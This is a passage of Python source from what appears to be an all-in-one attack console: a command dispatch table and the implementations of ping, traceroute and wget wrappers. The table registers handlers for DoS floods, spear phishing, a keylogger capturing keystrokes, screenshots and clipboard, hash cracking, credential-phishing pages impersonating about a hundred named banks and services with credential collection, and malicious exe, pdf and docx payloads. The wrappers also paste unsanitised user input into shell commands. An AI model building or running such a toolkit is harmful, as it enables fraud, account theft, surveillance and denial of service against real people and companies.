            'traceroute_numeric': self._traceroute_numeric,
            'mtr': self._mtr,
            'mtr_report': self._mtr_report,
            'mtr_json': self._mtr_json,
            'mtr_csv': self._mtr_csv,
            'tcptraceroute': self._tcptraceroute,
            'lft': self._lft,
            
            # ===== Wget Commands =====
            'wget': self._wget,
            'wget_output': self._wget_output,
            'wget_continue': self._wget_continue,
            'wget_background': self._wget_background,
            'wget_quiet': self._wget_quiet,
            'wget_recursive': self._wget_recursive,
            'wget_mirror': self._wget_mirror,
            'wget_spider': self._wget_spider,
            'wget_input': self._wget_input,
            'wget_header': self._wget_header,
            'wget_user_agent': self._wget_user_agent,
            'wget_referer': self._wget_referer,
            'wget_cookies': self._wget_cookies,
            'wget_save_cookies': self._wget_save_cookies,
            'wget_limit_rate': self._wget_limit_rate,
            'wget_timeout': self._wget_timeout,
            'wget_tries': self._wget_tries,
            'wget_retry': self._wget_retry,
            'wget_no_check_cert': self._wget_no_check_cert,
            'wget_certificate': self._wget_certificate,
            'wget_private_key': self._wget_private_key,
            'wget_ca_certificate': self._wget_ca_certificate,
            'wget_proxy': self._wget_proxy,
            'wget_no_proxy': self._wget_no_proxy,
            'wget_user': self._wget_user,
            'wget_password': self._wget_password,
            'wget_post_data': self._wget_post_data,
            'wget_post_file': self._wget_post_file,
            'wget_method': self._wget_method,
            'wget_body_data': self._wget_body_data,
            'wget_body_file': self._wget_body_file,
            'wget_timestamping': self._wget_timestamping,
            'wget_no_clobber': self._wget_no_clobber,
            'wget_delete_after': self._wget_delete_after,
            'wget_progress': self._wget_progress,
            'wget_show_progress': self._wget_show_progress,
            'wget_config': self._wget_config,
            'wget_append_output': self._wget_append_output,
            'wget_output_file': self._wget_output_file,
            'wget_no_parent': self._wget_no_parent,
            'wget_cut_dirs': self._wget_cut_dirs,
            'wget_directory_prefix': self._wget_directory_prefix,
            'wget_convert_links': self._wget_convert_links,
            'wget_backup_converted': self._wget_backup_converted,
            'wget_adjust_extension': self._wget_adjust_extension,
            'wget_restrict_file_names': self._wget_restrict_file_names,
            'wget_trust_server_names': self._wget_trust_server_names,
            'wget_content_disposition': self._wget_content_disposition,
            'wget_random_wait': self._wget_random_wait,
            'wget_wait': self._wget_wait,
            'wget_waitretry': self._wget_waitretry,
            'wget_quota': self._wget_quota,
            'wget_dns_timeout': self._wget_dns_timeout,
            'wget_connect_timeout': self._wget_connect_timeout,
            'wget_read_timeout': self._wget_read_timeout,
            'wget_retry_connrefused': self._wget_retry_connrefused,
            'wget_inet4_only': self._wget_inet4_only,
            'wget_inet6_only': self._wget_inet6_only,
            'wget_prefer_family': self._wget_prefer_family,
            'wget_bind_address': self._wget_bind_address,
            'wget_no_dns_cache': self._wget_no_dns_cache,
            'wget_no_http_keep_alive': self._wget_no_http_keep_alive,
            'wget_no_cache': self._wget_no_cache,
            'wget_no_cookies': self._wget_no_cookies,
            'wget_load_cookies': self._wget_load_cookies,
            'wget_keep_session_cookies': self._wget_keep_session_cookies,
            'wget_warc_file': self._wget_warc_file,
            'wget_warc_header': self._wget_warc_header,
            'wget_warc_max_size': self._wget_warc_max_size,
            'wget_warc_cdx': self._wget_warc_cdx,
            'wget_warc_dedup': self._wget_warc_dedup,
            'wget_no_warc_compression': self._wget_no_warc_compression,
            'wget_no_warc_digests': self._wget_no_warc_digests,
            'wget_no_warc_keep_log': self._wget_no_warc_keep_log,
            'wget_warc_tempdir': self._wget_warc_tempdir,
            'wget_help': self._wget_help,
            'wget_version': self._wget_version,
            
            # ===== Curl Commands =====
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_put': self._curl_put,
            'curl_delete': self._curl_delete,
            'curl_patch': self._curl_patch,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'curl_output': self._curl_output,
            'curl_remote_name': self._curl_remote_name,
            'curl_location': self._curl_location,
            'curl_include': self._curl_include,
            'curl_verbose': self._curl_verbose,
            'curl_silent': self._curl_silent,
            'curl_show_error': self._curl_show_error,
            'curl_fail': self._curl_fail,
            'curl_insecure': self._curl_insecure,
            'curl_data': self._curl_data,
            'curl_data_binary': self._curl_data_binary,
            'curl_data_urlencode': self._curl_data_urlencode,
            'curl_data_raw': self._curl_data_raw,
            'curl_form': self._curl_form,
            'curl_header': self._curl_header,
            'curl_user_agent': self._curl_user_agent,
            'curl_referer': self._curl_referer,
            'curl_user': self._curl_user,
            'curl_basic': self._curl_basic,
            'curl_digest': self._curl_digest,
            'curl_ntlm': self._curl_ntlm,
            'curl_negotiate': self._curl_negotiate,
            'curl_cookie': self._curl_cookie,
            'curl_cookie_jar': self._curl_cookie_jar,
            'curl_proxy': self._curl_proxy,
            'curl_proxy_user': self._curl_proxy_user,
            'curl_noproxy': self._curl_noproxy,
            'curl_cert': self._curl_cert,
            'curl_key': self._curl_key,
            'curl_cacert': self._curl_cacert,
            'curl_capath': self._curl_capath,
            'curl_ciphers': self._curl_ciphers,
            'curl_tlsv1_2': self._curl_tlsv1_2,
            'curl_tlsv1_3': self._curl_tlsv1_3,
            'curl_continue_at': self._curl_continue_at,
            'curl_range': self._curl_range,
            'curl_limit_rate': self._curl_limit_rate,
            'curl_max_filesize': self._curl_max_filesize,
            'curl_max_time': self._curl_max_time,
            'curl_connect_timeout': self._curl_connect_timeout,
            'curl_retry': self._curl_retry,
            'curl_retry_delay': self._curl_retry_delay,
            'curl_retry_max_time': self._curl_retry_max_time,
            'curl_retry_connrefused': self._curl_retry_connrefused,
            'curl_keepalive_time': self._curl_keepalive_time,
            'curl_no_keepalive': self._curl_no_keepalive,
            'curl_tcp_nodelay': self._curl_tcp_nodelay,
            'curl_ipv4': self._curl_ipv4,
            'curl_ipv6': self._curl_ipv6,
            'curl_interface': self._curl_interface,
            'curl_local_port': self._curl_local_port,
            'curl_dns_servers': self._curl_dns_servers,
            'curl_resolve': self._curl_resolve,
            'curl_connect_to': self._curl_connect_to,
            'curl_unix_socket': self._curl_unix_socket,
            'curl_http1_0': self._curl_http1_0,
            'curl_http1_1': self._curl_http1_1,
            'curl_http2': self._curl_http2,
            'curl_http3': self._curl_http3,
            'curl_compressed': self._curl_compressed,
            'curl_raw': self._curl_raw,
            'curl_ignore_content_length': self._curl_ignore_content_length,
            'curl_no_buffer': self._curl_no_buffer,
            'curl_write_out': self._curl_write_out,
            'curl_dump_header': self._curl_dump_header,
            'curl_trace': self._curl_trace,
            'curl_trace_ascii': self._curl_trace_ascii,
            'curl_manual': self._curl_manual,
            'curl_help': self._curl_help,
            'curl_version': self._curl_version,
            'curl_parallel': self._curl_parallel,
            'curl_config': self._curl_config,
            'curl_next': self._curl_next,
            'curl_styled_output': self._curl_styled_output,
            'curl_no_styled_output': self._curl_no_styled_output,
            'curl_progress_bar': self._curl_progress_bar,
            'curl_no_progress_meter': self._curl_no_progress_meter,
            'curl_url_query': self._curl_url_query,
            'curl_json': self._curl_json,
            'curl_variable': self._curl_variable,
            'curl_expand_url': self._curl_expand_url,
            'curl_aws_sigv4': self._curl_aws_sigv4,
            'curl_netrc': self._curl_netrc,
            'curl_netrc_file': self._curl_netrc_file,
            'curl_netrc_optional': self._curl_netrc_optional,
            'curl_ssl': self._curl_ssl,
            'curl_ssl_reqd': self._curl_ssl_reqd,
            'curl_ftp_port': self._curl_ftp_port,
            'curl_ftp_pasv': self._curl_ftp_pasv,
            'curl_ftp_ssl': self._curl_ftp_ssl,
            'curl_ftp_ssl_ccc': self._curl_ftp_ssl_ccc,
            'curl_ftp_create_dirs': self._curl_ftp_create_dirs,
            'curl_ftp_method': self._curl_ftp_method,
            'curl_ftp_pret': self._curl_ftp_pret,
            'curl_ftp_skip_pasv_ip': self._curl_ftp_skip_pasv_ip,
            'curl_disable_eprt': self._curl_disable_eprt,
            'curl_disable_epsv': self._curl_disable_epsv,
            'curl_tftp_blksize': self._curl_tftp_blksize,
            'curl_tftp_no_options': self._curl_tftp_no_options,
            'curl_upload_file': self._curl_upload_file,
            'curl_mail_from': self._curl_mail_from,
            'curl_mail_rcpt': self._curl_mail_rcpt,
            'curl_mail_auth': self._curl_mail_auth,
            'curl_sasl_ir': self._curl_sasl_ir,
            'curl_login_options': self._curl_login_options,
            'curl_url': self._curl_url,
            'curl_disable': self._curl_disable,
            'curl_no_sessionid': self._curl_no_sessionid,
            'curl_no_http_keepalive': self._curl_no_http_keepalive,
            'curl_buffered': self._curl_buffered,
            'curl_happy_eyeballs_timeout': self._curl_happy_eyeballs_timeout,
            'curl_expect100_timeout': self._curl_expect100_timeout,
            'curl_speed_limit': self._curl_speed_limit,
            'curl_speed_time': self._curl_speed_time,
            'curl_stderr': self._curl_stderr,
            'curl_no_stderr': self._curl_no_stderr,
            'curl_tcp_keepalive': self._curl_tcp_keepalive,
            'curl_crlf': self._curl_crlf,
            'curl_skip_existing': self._curl_skip_existing,
            'curl_xattr': self._curl_xattr,
            'curl_no_xattr': self._curl_no_xattr,
            'curl_use_ascii': self._curl_use_ascii,
            'curl_disallow_username_in_url': self._curl_disallow_username_in_url,
            'curl_globoff': self._curl_globoff,
            'curl_haproxy_clientip': self._curl_haproxy_clientip,
            'curl_proxy_cacert': self._curl_proxy_cacert,
            'curl_proxy_capath': self._curl_proxy_capath,
            'curl_proxy_cert': self._curl_proxy_cert,
            'curl_proxy_cert_type': self._curl_proxy_cert_type,
            'curl_proxy_ciphers': self._curl_proxy_ciphers,
            'curl_proxy_crlfile': self._curl_proxy_crlfile,
            'curl_proxy_header': self._curl_proxy_header,
            'curl_proxy_key': self._curl_proxy_key,
            'curl_proxy_key_type': self._curl_proxy_key_type,
            'curl_proxy_pass': self._curl_proxy_pass,
            'curl_proxy_service_name': self._curl_proxy_service_name,
            'curl_proxy_tls13_ciphers': self._curl_proxy_tls13_ciphers,
            'curl_proxy_tlsauthtype': self._curl_proxy_tlsauthtype,
            'curl_proxy_tlspassword': self._curl_proxy_tlspassword,
            'curl_proxy_tlsuser': self._curl_proxy_tlsuser,
            'curl_proxy_tlsv1': self._curl_proxy_tlsv1,
            'curl_proxy1_0': self._curl_proxy1_0,
            'curl_socks4': self._curl_socks4,
            'curl_socks4a': self._curl_socks4a,
            'curl_socks5': self._curl_socks5,
            'curl_socks5_hostname': self._curl_socks5_hostname,
            'curl_socks5_basic': self._curl_socks5_basic,
            'curl_socks5_gssapi': self._curl_socks5_gssapi,
            'curl_socks5_gssapi_nec': self._curl_socks5_gssapi_nec,
            'curl_socks5_gssapi_service': self._curl_socks5_gssapi_service,
            'curl_preproxy': self._curl_preproxy,
            'curl_abstract_unix_socket': self._curl_abstract_unix_socket,
            'curl_tls13_ciphers': self._curl_tls13_ciphers,
            'curl_tlsauthtype': self._curl_tlsauthtype,
            'curl_tlspassword': self._curl_tlspassword,
            'curl_tlsuser': self._curl_tlsuser,
            'curl_crlfile': self._curl_crlfile,
            'curl_cert_status': self._curl_cert_status,
            'curl_false_start': self._curl_false_start,
            'curl_no_alpn': self._curl_no_alpn,
            'curl_no_npn': self._curl_no_npn,
            'curl_compressed_ssh': self._curl_compressed_ssh,
            'curl_ssl_allow_beast': self._curl_ssl_allow_beast,
            'curl_no_ssl_session_reuse': self._curl_no_ssl_session_reuse,
            
            # ===== Nmap Commands =====
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_ping': self._nmap_ping,
            'nmap_ports': self._nmap_ports,
            'nmap_script': self._nmap_script,
            'nmap_aggressive': self._nmap_aggressive,
            'nmap_traceroute': self._nmap_traceroute,
            'nmap_output': self._nmap_output,
            'nmap_exclude': self._nmap_exclude,
            'nmap_exclude_file': self._nmap_exclude_file,
            'nmap_input': self._nmap_input,
            'nmap_random': self._nmap_random,
            'nmap_timing': self._nmap_timing,
            'nmap_version': self._nmap_version,
            'nmap_help': self._nmap_help,
            
            # ===== SSH Commands =====
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # ===== Traffic Generation =====
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # ===== Nikto Commands =====
            'nikto': self._nikto,
            'nikto_full': self._nikto_full,
            'nikto_ssl': self._nikto_ssl,
            
            # ===== DOS Attacks =====
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            
            # ===== Spear Phishing =====
            'spear_create': self._spear_create,
            'spear_send': self._spear_send,
            'spear_list': self._spear_list,
            
            # ===== Keylogger Commands =====
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # ===== Cracking Commands =====
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            'crack_md5': self._crack_md5,
            'crack_sha1': self._crack_sha1,
            'crack_sha256': self._crack_sha256,
            'crack_sha512': self._crack_sha512,
            'crack_ntlm': self._crack_ntlm,
            'crack_bcrypt': self._crack_bcrypt,
            'crack_all': self._crack_all,
            
            # ===== Docker Commands =====
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            
            # ===== Reverse Engineering Commands =====
            're_strings': self._re_strings,
            're_hexdump': self._re_hexdump,
            're_disassemble': self._re_disassemble,
            're_decompile': self._re_decompile,
            're_decode': self._re_decode,
            're_metadata': self._re_metadata,
            're_extract': self._re_extract,
            're_analyze': self._re_analyze,
            're_list': self._re_list,
            
            # ===== Social Engineering =====
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_microsoft': lambda _: self._phish('microsoft'),
            'phish_google': lambda _: self._phish('google'),
            'phish_apple': lambda _: self._phish('apple'),
            'phish_paypal': lambda _: self._phish('paypal'),
            'phish_amazon': lambda _: self._phish('amazon'),
            'phish_netflix': lambda _: self._phish('netflix'),
            'phish_spotify': lambda _: self._phish('spotify'),
            'phish_whatsapp': lambda _: self._phish('whatsapp'),
            'phish_telegram': lambda _: self._phish('telegram'),
            'phish_discord': lambda _: self._phish('discord'),
            'phish_snapchat': lambda _: self._phish('snapchat'),
            'phish_tiktok': lambda _: self._phish('tiktok'),
            'phish_reddit': lambda _: self._phish('reddit'),
            'phish_github': lambda _: self._phish('github'),
            'phish_gitlab': lambda _: self._phish('gitlab'),
            'phish_protonmail': lambda _: self._phish('protonmail'),
            'phish_yahoo': lambda _: self._phish('yahoo'),
            'phish_slack': lambda _: self._phish('slack'),
            'phish_zoom': lambda _: self._phish('zoom'),
            'phish_teams': lambda _: self._phish('teams'),
            'phish_steam': lambda _: self._phish('steam'),
            'phish_roblox': lambda _: self._phish('roblox'),
            'phish_twitch': lambda _: self._phish('twitch'),
            'phish_epicgames': lambda _: self._phish('epicgames'),
            'phish_minecraft': lambda _: self._phish('minecraft'),
            'phish_xbox': lambda _: self._phish('xbox'),
            'phish_playstation': lambda _: self._phish('playstation'),
            'phish_cashapp': lambda _: self._phish('cashapp'),
            'phish_venmo': lambda _: self._phish('venmo'),
            'phish_chase': lambda _: self._phish('chase'),
            'phish_wellsfargo': lambda _: self._phish('wellsfargo'),
            'phish_bankofamerica': lambda _: self._phish('bankofamerica'),
            'phish_citibank': lambda _: self._phish('citibank'),
            'phish_capitalone': lambda _: self._phish('capitalone'),
            'phish_americanexpress': lambda _: self._phish('americanexpress'),
            'phish_discover': lambda _: self._phish('discover'),
            'phish_barclays': lambda _: self._phish('barclays'),
            'phish_hsbc': lambda _: self._phish('hsbc'),
            'phish_revolut': lambda _: self._phish('revolut'),
            'phish_monzo': lambda _: self._phish('monzo'),
            'phish_stripe': lambda _: self._phish('stripe'),
            'phish_square': lambda _: self._phish('square'),
            'phish_coinbase': lambda _: self._phish('coinbase'),
            'phish_binance': lambda _: self._phish('binance'),
            'phish_kraken': lambda _: self._phish('kraken'),
            'phish_metamask': lambda _: self._phish('metamask'),
            'phish_tinder': lambda _: self._phish('tinder'),
            'phish_bumble': lambda _: self._phish('bumble'),
            'phish_hinge': lambda _: self._phish('hinge'),
            'phish_okcupid': lambda _: self._phish('okcupid'),
            'phish_match': lambda _: self._phish('match'),
            'phish_grindr': lambda _: self._phish('grindr'),
            'phish_hulu': lambda _: self._phish('hulu'),
            'phish_disneyplus': lambda _: self._phish('disneyplus'),
            'phish_hbomax': lambda _: self._phish('hbomax'),
            'phish_primevideo': lambda _: self._phish('primevideo'),
            'phish_appletv': lambda _: self._phish('appletv'),
            'phish_paramount': lambda _: self._phish('paramount'),
            'phish_peacock': lambda _: self._phish('peacock'),
            'phish_crunchyroll': lambda _: self._phish('crunchyroll'),
            'phish_ebay': lambda _: self._phish('ebay'),
            'phish_walmart': lambda _: self._phish('walmart'),
            'phish_target': lambda _: self._phish('target'),
            'phish_bestbuy': lambda _: self._phish('bestbuy'),
            'phish_etsy': lambda _: self._phish('etsy'),
            'phish_aliexpress': lambda _: self._phish('aliexpress'),
            'phish_alibaba': lambda _: self._phish('alibaba'),
            'phish_wish': lambda _: self._phish('wish'),
            'phish_shein': lambda _: self._phish('shein'),
            'phish_temu': lambda _: self._phish('temu'),
            'phish_aws': lambda _: self._phish('aws'),
            'phish_azure': lambda _: self._phish('azure'),
            'phish_gcp': lambda _: self._phish('gcp'),
            'phish_digitalocean': lambda _: self._phish('digitalocean'),
            'phish_cloudflare': lambda _: self._phish('cloudflare'),
            'phish_namecheap': lambda _: self._phish('namecheap'),
            'phish_godaddy': lambda _: self._phish('godaddy'),
            'phish_heroku': lambda _: self._phish('heroku'),
            'phish_vercel': lambda _: self._phish('vercel'),
            'phish_netlify': lambda _: self._phish('netlify'),
            'phish_coursera': lambda _: self._phish('coursera'),
            'phish_udemy': lambda _: self._phish('udemy'),
            'phish_edx': lambda _: self._phish('edx'),
            'phish_khanacademy': lambda _: self._phish('khanacademy'),
            'phish_duolingo': lambda _: self._phish('duolingo'),
            'phish_irs': lambda _: self._phish('irs'),
            'phish_dmv': lambda _: self._phish('dmv'),
            'phish_usps': lambda _: self._phish('usps'),
            'phish_fedex': lambda _: self._phish('fedex'),
            'phish_ups': lambda _: self._phish('ups'),
            'phish_nordvpn': lambda _: self._phish('nordvpn'),
            'phish_expressvpn': lambda _: self._phish('expressvpn'),
            'phish_surfshark': lambda _: self._phish('surfshark'),
            'phish_lastpass': lambda _: self._phish('lastpass'),
            'phish_1password': lambda _: self._phish('1password'),
            'phish_custom': lambda _: self._phish('custom'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'phish_list': self._phish_list,
            
            # ===== Payload Commands =====
            'payload_exe': self._payload_exe,
            'payload_pdf': self._payload_pdf,
            'payload_docx': self._payload_docx,
            'payload_link': self._payload_link,
            'payload_network': self._payload_network,
            'payload_list': self._payload_list,
            'payload_deploy': self._payload_deploy,
            
            # ===== Domain Translation =====
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            'host_domain': self._host_domain,
            'host_website': self._host_website,
            'list_domains': self._list_domains,
            'domain_info': self._domain_info,
            
            # ===== IP Management =====
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # ===== Network Commands =====
            'whois': self._whois,
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'location': self._location,
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            
            # ===== Report Commands =====
            'report_pdf': self._report_pdf,
            'report_json': self._report_json,
            'report_both': self._report_both,
            'report_list': self._report_list,
            
            # ===== System Commands =====
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'clear': self._clear,
            'help': self._help,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Ping Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        return self._generic(f'ping6 -c 4 {args[0]}')
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network>'}
        return self._generic(f'nmap -sn {args[0]}')
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        return self._generic(f'fping {" ".join(args)}')
    
    def _ping_flood(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood <target>'}
        return self._generic(f'ping -f {args[0]}')
    
    def _ping_mtu(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_mtu <target> <size>'}
        return self._generic(f'ping -M do -s {args[1]} {args[0]}')
    
    def _ping_size(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        return self._generic(f'ping -s {args[1]} {args[0]}')
    
    def _ping_count(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        return self._generic(f'ping -c {args[1]} {args[0]}')
    
    def _ping_interval(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interval <target> <interval>'}
        return self._generic(f'ping -i {args[1]} {args[0]}')
    
    def _ping_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_timeout <target> <timeout>'}
        return self._generic(f'ping -W {args[1]} {args[0]}')
    
    def _ping_ttl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_ttl <target> <ttl>'}
        return self._generic(f'ping -t {args[1]} {args[0]}')
    
    def _ping_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interface <target> <interface>'}
        return self._generic(f'ping -I {args[1]} {args[0]}')
    
    def _ping_source(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_source <target> <source_ip>'}
        return self._generic(f'ping -S {args[1]} {args[0]}')
    
    def _ping_pattern(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_pattern <target> <pattern>'}
        return self._generic(f'ping -p {args[1]} {args[0]}')
    
    def _ping_record(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_record <target>'}
        return self._generic(f'ping -R {args[0]}')
    
    def _ping_timestamp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_timestamp <target>'}
        return self._generic(f'ping -D {args[0]}')
    
    def _ping_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_quiet <target>'}
        return self._generic(f'ping -q -c 5 {args[0]}')
    
    def _ping_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_verbose <target>'}
        return self._generic(f'ping -v {args[0]}')
    
    # ==================== Traceroute Commands ====================
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute6 <target>'}
        return self._generic(f'traceroute6 {args[0]}')
    
    def _traceroute_tcp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_tcp <target>'}
        return self._generic(f'traceroute -T {args[0]}')
    
    def _traceroute_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        return self._generic(f'traceroute -U {args[0]}')
    
    def _traceroute_icmp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        return self._generic(f'traceroute -I {args[0]}')
    
    def _traceroute_max_hops(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_max_hops <target> <hops>'}
        return self._generic(f'traceroute -m {args[1]} {args[0]}')
    
    def _traceroute_first_hop(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_first_hop <target> <hop>'}
        return self._generic(f'traceroute -f {args[1]} {args[0]}')
    
    def _traceroute_queries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_queries <target> <queries>'}
        return self._generic(f'traceroute -q {args[1]} {args[0]}')
    
    def _traceroute_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_wait <target> <seconds>'}
        return self._generic(f'traceroute -w {args[1]} {args[0]}')
    
    def _traceroute_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_port <target> <port>'}
        return self._generic(f'traceroute -p {args[1]} {args[0]}')
    
    def _traceroute_numeric(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_numeric <target>'}
        return self._generic(f'traceroute -n {args[0]}')
    
    def _mtr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr <target>'}
        return self._generic(f'mtr {args[0]}')
    
    def _mtr_report(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_report <target>'}
        return self._generic(f'mtr --report {args[0]}')
    
    def _mtr_json(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_json <target>'}
        return self._generic(f'mtr --json {args[0]}')
    
    def _mtr_csv(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_csv <target>'}
        return self._generic(f'mtr --csv {args[0]}')
    
    def _tcptraceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tcptraceroute <target>'}
        return self._generic(f'tcptraceroute {args[0]}')
    
    def _lft(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: lft <target>'}
        return self._generic(f'lft {args[0]}')
    
    # ==================== Wget Commands ====================
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url>'}
        return self._generic(f'wget {args[0]}')
    
    def _wget_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output <url> <file>'}
        return self._generic(f'wget -O {args[1]} {args[0]}')
    
    def _wget_continue(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_continue <url>'}
        return self._generic(f'wget -c {args[0]}')
    
    def _wget_background(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_background <url>'}
        return self._generic(f'wget -b {args[0]}')
    
    def _wget_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_quiet <url>'}
        return self._generic(f'wget -q {args[0]}')
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        return self._generic(f'wget -r {args[0]}')
    
    def _wget_mirror(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        return self._generic(f'wget -m {args[0]}')
    
    def _wget_spider(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_spider <url>'}
        return self._generic(f'wget --spider {args[0]}')
    
    def _wget_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_input <file>'}
        return self._generic(f'wget -i {args[0]}')
    
    def _wget_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_header <url> <header>'}
        return self._generic(f'wget --header="{args[1]}" {args[0]}')
    
    def _wget_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user_agent <url> <agent>'}
        return self._generic(f'wget --user-agent="{args[1]}" {args[0]}')
    
    def _wget_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
